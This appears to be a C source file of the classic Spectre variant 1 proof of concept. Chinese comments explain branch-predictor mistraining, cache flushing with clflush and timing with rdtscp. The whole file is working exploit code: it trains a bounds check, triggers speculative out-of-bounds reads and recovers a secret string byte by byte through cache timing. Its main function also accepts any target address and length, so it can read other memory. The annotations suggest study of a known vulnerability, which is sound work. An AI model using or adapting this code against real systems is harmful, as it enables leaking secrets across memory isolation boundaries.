#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER  //_MSC_VER 是微软编译器的特定预定义宏，检查是否在Microsoft 编译器（如 MSVC）上编译
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)  //启用全局优化
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
//rdtscp: 这条指令读取 CPU 的时间戳计数器（TSC），并且是序列化的。这意味着在执行 rdtscp 指令之前的所有指令都会执行完毕
//cflush：清除特定缓存行，确保在随后访问该缓存行时需要从内存中加载

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];
//uint8_t表示无符号的 8 位整数，取值是0-255

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* cache hit if time <= threshold */


//size_t是无符号整数类型，能够存储在当前系统上最大对象的大小
/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2],
										int score[2])//这个函数只针对一个字节
{
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;//register提示编译器尽量将变量存在寄存器中
	volatile uint8_t *addr;//volatile表示该变量可以在程序正常流控制之外的某些操作中被修改，如硬件中断或多线程环境。

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* clflush */ //运行一次函数可以冲刷多大的缓存

		/* 5 trainings (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;//合法索引
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size);//清空array1_size的地址缓存，便于触发分支预测
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j % 6 != 0
			 * or malicious_x if j % 6 == 0 */
			/* Avoid jumps in case those tip off the branch predictor */
			/* Set x=FFFF0000 if j%6==0, else x=0 */
			// &是按位与，~是按位取反，^是按位异或，>>是按位右移
			//按照五次训练后一次错误预测的形式，并且避免了if语句，减少分支预测的触发
			/*
			0xFFFF = 1111 1111 1111 1111    ~0xFFFF = 1111 1111 1111 1111 0000 0000 0000 0000
			-1 = 1111 1111 1111 1111 1111 1111 1111 1111
			((j % 6) - 1)取值0-4时，与~0xFFFF按位与得到的结果x是0
			((j % 6) - 1)取值-1时，与~0xFFFF按位与得到的结果x是1111 1111 1111 1111 0000 0000 0000 0000
			*/
			x = ((j % 6) - 1) & ~0xFFFF;
			/*
			x = 0时，(x | (x >> 16))的结果是0
			x = 0xFFFF0000时，(x | (x >> 16))得到的结果是0xFFFFFFFF，也就是-1
			*/
			x = (x | (x >> 16));/* Set x=-1 if j&6=0, else x=0 */
			/* 按位异或^异或：相同为0，不同为1
			(malicious_x ^ training_x)会生成一个掩码，标识出 malicious_x 和 training_x 的不同位
			
			(x & (malicious_x ^ training_x))：
			如果 x 为 -1（所有位都为1），结果将是 malicious_x ^ training_x
			如果 x 为 0，结果将是 0

			training_x ^ (x & (malicious_x ^ training_x))：
			当 x 为 -1 时，结果就是 malicious_x。
			当 x 为 0 时，结果还是 training_x。
			*/
			x = training_x ^ (x & (malicious_x ^ training_x));
			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Mixed-up order to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;//防止缓存预取
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk);
			junk = *addr;//访问缓存行										 /* Time memory access */
			time2 = __rdtscp(&junk) - time1; /* Compute elapsed time */
			if (time2 <= CACHE_HIT_THRESHOLD &&
					mix_i != array1[tries % array1_size])//把训练时load的缓存行次数剔除掉
				results[mix_i]++; /* cache hit -> score +1 for this value */
		}

		/* Locate highest & second-highest results */
		//j 代表highest，k代表second-highest
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) ||
				(results[j] == 2 && results[k] == 0))//连续两次try将j判定为最可能的就直接break
			break; /* Success if best is > 2*runner-up + 5 or 2/0) */
	}
	/* use junk to prevent code from being optimized out */
	results[0] ^= junk;
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char **argv)
{
	//malicious_x表示secret在内存中的位置相对于array1的偏移量
	size_t malicious_x =
			(size_t)(secret - (char *)array1); /* default for malicious_x */
	int i, score[2], len = 40;
	uint8_t value[2];

	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 to ensure it is memory backed */
	if (argc == 3)
	{
		sscanf(argv[1], "%p", (void **)(&malicious_x));
		malicious_x -= (size_t)array1; /* Input value to pointer */
		sscanf(argv[2], "%d", &len);
	}

	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
		printf("0x%02X='%c' score=%d ", value[0],
					 (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
	}
	return (0);
}